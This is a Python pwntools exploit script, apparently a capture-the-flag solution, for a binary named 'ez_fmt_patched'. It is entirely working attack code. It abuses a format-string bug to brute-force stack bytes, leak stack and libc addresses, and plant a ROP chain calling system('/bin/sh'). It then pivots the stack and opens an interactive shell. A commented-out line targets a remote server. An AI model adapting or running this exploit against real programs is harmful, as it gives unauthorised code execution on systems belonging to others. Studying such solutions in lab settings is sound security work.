from pwn import *

r = process('./ez_fmt_patched')
#r = remote('192.81.209.60', 2022)
bin = ELF('./ez_fmt_patched')
libc = ELF('./libc.so.6')
context.clear(os='linux', arch='x86_64')#, log_level='debug')

def debug():
    gdb.attach(r, '''b*main''')
debug()
r.sendlineafter(b'Service :##\n', b'%21$cmmm')
last_byte = (r.recvline()[0] - 0x158) & 0xff
guess_two_byte = 0

for i in range(0, 0x100, 3):
    log.info('Count: %#x' % i)
    guess_two_byte = last_byte + 0x300 * i
    payload = f'%{guess_two_byte+0x20}c%21$hnmmm'.encode()
    r.sendline(payload)

    payload = '%49c%49$hhnmmm'.encode()
    r.sendlineafter(b'mmm\n', payload)

    r.sendlineafter(b'mmm\n', b'%10$c%42$c%74$cmmm')
    recv = r.recvuntil(b'mmm\n')
    if recv[0] == 49:
        break

    if  recv[1] == 49:
        guess_two_byte -= 0x100
        break

    if  recv[2] == 49:
        guess_two_byte -= 0x200
        break

log.info('Guess: %#x' % guess_two_byte)
payload = f'%{guess_two_byte-8}c%21$hnmmm'.encode()
r.sendline(payload)

payload = f'%{guess_two_byte+8}c%37$hnmmm'.encode()
r.sendlineafter(b'mmm\n', payload)

val = int.from_bytes(b'p', 'little') - 0x45
payload = f'%{0x45}c%49$hhn%{val}c%51$hhnmmm'.encode()
r.sendlineafter(b'mmm\n', payload)
r.recvuntil(b'mmm\n')
r.recv(0x45)

stack = int(r.recv(14), 16) + 8
log.success('Stack: %#x' % stack)

# debug()

payload = f'%{guess_two_byte+6}c%37$hnmmm'.encode()
r.sendlineafter(b'mmm\n', payload)

val = int.from_bytes(b'9$p', 'little') - 0x45
payload = f'%{0x45}c%10$hhn%{val}c%51$nmmm'.encode().ljust(0x20, b'\0') + p64(stack-8)
r.sendlineafter(b'mmm\n', payload)
r.recvuntil(b'0x')

libc.address = int(r.recv(12), 16) - 0x24083
log.success('Libc base: %#x' % libc.address)

pop_rdi_ret = 0x0000000000023b6a
ret = 0x0000000000054310
add_rsp_0x68_ret = 0x000000000010e4cc

r.sendline(b'mmm')
def write(addr, value):
    for i in range(3):
        val = (value >> (16 * i)) & 0xffff
        payload = f'%{val}c%10$hnmmm'.encode().ljust(0x20, b'\0') + p64(addr + (i*2))
        r.sendlineafter(b'mmm', payload)

    payload = f'%10$hnmmm'.encode().ljust(0x20, b'\0') + p64(addr + 6)
    r.sendlineafter(b'mmm', payload)

write(stack+0x68, libc.address+pop_rdi_ret)
write(stack+0x70, next(libc.search(b'/bin/sh')))
write(stack+0x78, libc.address+ret)
write(stack+0x80, libc.symbols['system'])

# debug()

def gen_payload(l):
    payload = ''
    sum = 0
    value = 0
    for i in l:
        if i[1] == 'hhn':
            if i[0] < (sum & 0xff):
                value = (i[0] - (sum & 0xff)) + 0x100
            else:
                value = i[0] - (sum & 0xff)
        elif i[1] == 'hn':
            if i[0] < (sum & 0xffff):
                value = (i[0] - (sum & 0xffff)) + 0x10000
            else:
                value = i[0] - (sum & 0xffff)
        elif i[1] == 'n':
            if i[0] < (sum & 0xffffffff):
                value = (i[0] - (sum & 0xffffffff)) + 0x100000000
            else:
                value = i[0] - (sum & 0xffffffff)

        sum += value
        payload += f'%{value}c%{i[2]}$' + i[1]

    return payload.encode()

addr = libc.address + add_rsp_0x68_ret
part1 = addr & 0xffff
part2 = (addr >> 16) & 0xffff
part3 = (addr >> 32) & 0xffff
payload = gen_payload([[part1, 'hn', 12], [part2, 'hn', 13], [part3, 'hn', 14]])
payload = payload.ljust(0x30, b'\0') + p64(stack-8) + p64(stack-6) + p64(stack-4)
r.sendlineafter(b'mmm', payload)

r.interactive()